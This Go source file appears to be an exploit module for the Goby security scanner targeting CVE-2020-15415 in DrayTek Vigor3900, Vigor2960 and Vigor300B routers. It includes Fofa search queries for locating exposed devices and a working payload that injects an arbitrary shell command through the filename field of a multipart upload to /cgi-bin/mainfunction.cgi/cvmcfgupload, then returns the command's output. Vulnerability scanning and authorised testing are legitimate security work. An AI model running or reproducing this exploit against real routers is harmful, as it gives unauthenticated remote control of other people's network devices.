package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Draytek Vigor Multiple VPN Routers Unauthenticated Remote Code Execution Vulnerability (CVE-2020-15415)",
    "Description": "<p>DrayTek Vigor3900, etc. are all products of China Taiwan Juyi Technology (DrayTek) company. DrayTek Vigor3900 is a broadband router/VPN gateway device. Vigor2960 is a load balancing router and VPN gateway device. Vigor300B is a load balancing router.</p><p>A security vulnerability exists in DrayTek Vigor3900, Vigor2960 and Vigor300B versions prior to 1.5.1. An attacker could exploit this vulnerability to execute commands with the help of shell metacharacters.</p>",
    "Impact": "<p>Draytek Vigor Multiple VPN Routers Unauthenticated Remote Code Execution Vulnerability (CVE-2020-15415)</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. For details, please pay attention to the manufacturer's homepage: <a href=\"https://www.draytek.com/\">https://www.draytek.com/</a></p>",
    "Product": "DrayTek-Vigor3900",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Draytek Vigor多款VPN路由器未认证远程代码执行漏洞（CVE-2020-15415）",
            "Product": "DrayTek-Vigor3900",
            "Description": "<p>DrayTek Vigor3900等都是中国台湾居易科技（DrayTek）公司的产品。DrayTek Vigor3900是一款宽带路由器/VPN网关设备。Vigor2960是一款负载平衡路由器和VPN网关设备。Vigor300B是一款负载均衡路由器。</p><p>DrayTek Vigor3900、Vigor2960和Vigor300B 1.5.1之前版本中存在安全漏洞。攻击者可借助shell元字符利用该漏洞执行命令。</p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，详情请关注厂商主页：<a href=\"https://www.draytek.com/\">https://www.draytek.com/</a></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Draytek Vigor Multiple VPN Routers Unauthenticated Remote Code Execution Vulnerability (CVE-2020-15415)",
            "Product": "DrayTek-Vigor3900",
            "Description": "<p>DrayTek Vigor3900, etc. are all products of China Taiwan Juyi Technology (DrayTek) company. DrayTek Vigor3900 is a broadband router/VPN gateway device. Vigor2960 is a load balancing router and VPN gateway device. Vigor300B is a load balancing router.</p><p>A security vulnerability exists in DrayTek Vigor3900, Vigor2960 and Vigor300B versions prior to 1.5.1. An attacker could exploit this vulnerability to execute commands with the help of shell metacharacters.</p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. For details, please pay attention to the manufacturer's homepage:&nbsp;<a href=\"https://www.draytek.com/\">https://www.draytek.com/</a></p>",
            "Impact": "<p>Draytek Vigor Multiple VPN Routers Unauthenticated Remote Code Execution Vulnerability (CVE-2020-15415)</p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "body=\"V2960/V2960.nocache.js\" ||body=\"V3900/V3900.nocache.js\"||body=\"V300B/V300B.nocache.js\"",
    "GobyQuery": "body=\"V2960/V2960.nocache.js\" ||body=\"V3900/V3900.nocache.js\"||body=\"V300B/V300B.nocache.js\"",
    "Author": "sharecast.net@gmail.com",
    "Homepage": "https://www.draytek.com/",
    "DisclosureDate": "2020-06-30",
    "References": [
        "https://github.com/CLP-team/Vigor-Commond-Injection"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2020-15415"
    ],
    "CNVD": [
        "CNVD-2020-51416"
    ],
    "CNNVD": [
        "CNNVD-202006-1856"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "CVSSScore": "9.8",
    "PostTime": "2023-08-10",
    "PocId": "10670"
}`

	sendPayloadFlagsxkG := func(hostInfo *httpclient.FixUrl, cmd string) (*httpclient.HttpResponse, error) {
		payloadRequestConfig := httpclient.NewPostRequestConfig(`/cgi-bin/mainfunction.cgi/cvmcfgupload?1=2`)
		payloadRequestConfig.VerifyTls = false
		payloadRequestConfig.FollowRedirect = false
		payloadRequestConfig.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundary")
		payloadRequestConfig.Data = "------WebKitFormBoundary                                         \nContent-Disposition: form-data; name=\"abc\"; filename=\"t';" + cmd + ";echo '_\"\nContent-Type: text/x-python-script\n\n\n\n------WebKitFormBoundary--"
		return httpclient.DoHttpRequest(hostInfo, payloadRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(16)
			rsp, err := sendPayloadFlagsxkG(u, `echo `+checkStr)
			if err != nil || rsp == nil {
				return false
			}
			return strings.Contains(rsp.Utf8Html, checkStr) && !strings.Contains(rsp.Utf8Html, "echo ")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			cmd := goutils.B2S(ss.Params["cmd"])
			if attackType != "cmd" {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
				return expResult
			}
			rsp, err := sendPayloadFlagsxkG(expResult.HostInfo, cmd)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			}
			if rsp.StatusCode != 200 {
				expResult.Success = false
				expResult.Output = "漏洞利用失败"
			} else {
				expResult.Success = true
				expResult.Output = strings.ReplaceAll(rsp.Utf8Html, `Content-Length: 0`, ``)
			}
			return expResult
		},
	))
}
